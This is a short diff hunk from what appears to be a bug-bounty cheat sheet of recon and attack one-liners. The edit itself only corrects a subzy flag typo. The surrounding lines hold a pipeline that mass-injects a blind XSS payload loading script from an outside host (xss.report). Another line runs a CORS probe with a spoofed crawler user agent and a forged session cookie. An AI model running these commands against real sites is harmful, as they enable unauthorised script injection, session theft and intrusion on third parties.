@@ -16,7 +16,7 @@
 
 8. subfinder -d example.com | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload "<script src=https://xss.report/c/coffinxp></script>"
 
-9. subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_sst
+9. subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
 
 10. python corsy.py -i /home/coffinxp/waitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
 
